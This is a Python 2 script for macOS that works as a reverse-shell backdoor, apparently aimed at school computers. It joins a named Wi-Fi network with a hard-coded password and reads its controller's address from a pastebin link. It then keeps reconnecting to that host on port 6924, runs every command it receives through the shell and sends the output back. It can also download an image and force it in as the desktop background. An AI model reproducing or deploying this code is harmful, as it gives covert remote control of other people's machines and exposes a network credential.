import subprocess
# Import socket module
import socket
# import sleep from time
from time import sleep
# import sys
import sys
import urllib

# ip = sys.argv[1]
# ip = '172.31.3.215'
# ip = '192.168.10.145'

# initialize drugs

wifiConnection = 'networksetup -setairportnetwork en0 Fridaskolan vanersborg0521'
print wifiConnection.split()
subprocess.call(wifiConnection, shell=True)

try:
    url = 'https://pastebin.com/raw/SLGhJAhr'
    response = urllib.urlopen(url)
    if response.getcode() is 200:
        ip = response.read()
except:
    pass


def handlecommand(string):
    special = False
    try:
        print string.split()[0]
        if string.split()[0] == """setbackground""":
            special = True
            if len(string.split()) is 3:
                filename = string.split()[2]
                f = open(filename, 'wb')
                f.write(urllib.urlopen(string.split()[1]).read())
                f.close()
                pwd = subprocess.check_output("pwd", shell=True)
                pwd = pwd[:-1]
                newstr = """sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '""" + pwd + "/" + filename + """'";"""
                print newstr
                res = subprocess.check_output(newstr, shell=True)
                subprocess.check_output("killall Dock", shell=True)
    except:
        return "failed"
    if not special:
        res = subprocess.check_output(string, shell=True)
    return res


# setup steroids

# Define the port on which you want to connect
port = 6924
running = True


def newconnection():
    global running
    while running:
        # connect to the server on local computer
        try:
            sleep(2)
            # print "trying to connect"
            # Create a socket object
            s = socket.socket()
            s.connect((ip, port))
            # print "connected"

            while True:
                # receive data from the server
                res = s.recv(1024)
                print res
                if res == "stopLoop":
                    running = False
                    s.sendall(b"Loop stopped")
                elif res == "restartLoop":
                    running = True
                    s.sendall(b"Loop restarted")
                elif res is 'exit':
                    break
                else:
                    try:
                        answ = "\n" + str(handlecommand(res)) + "\nDone, now listening\n"
                        s.sendall(bytes(answ))
                    except:
                        try:
                            s.sendall(b"Error")
                        except:
                            break

            # close the connection
            s.close()
            # print "disconnected"
            newconnection()
        except:
            pass


newconnection()
